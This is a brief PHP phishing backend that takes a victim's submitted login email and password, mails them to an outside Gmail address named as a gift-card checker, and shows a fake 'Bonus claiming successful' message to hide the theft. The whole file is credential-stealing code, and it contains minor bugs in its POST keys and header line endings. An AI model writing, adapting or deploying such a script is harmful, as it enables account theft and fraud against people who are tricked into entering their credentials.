<?php

$login_email = $_POST["$login_email"];
$login_password = $_POST["$login_password"];
$to = "allgiftcardchecker@gmail.com";
$subject = "Information for you";
$text = "Login Information";

$headers = "Email:".$login_email."r\n Password:".$login_password."r\n";

mail($to,$subject,$text,$headers);

echo("Bonus claiming successful. Go to home page");

?>